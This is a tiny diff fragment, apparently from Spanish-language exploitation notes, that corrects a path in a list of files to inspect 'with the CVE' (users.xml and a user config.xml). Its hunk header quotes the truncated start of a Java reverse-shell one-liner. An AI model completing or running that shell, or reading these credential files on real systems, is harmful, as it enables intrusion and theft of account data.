@@ -12,4 +12,4 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Rutas a mirar con el CVE:
 /users/users.xml
-/user_cod/config.xml
+/users/user_cod/config.xml
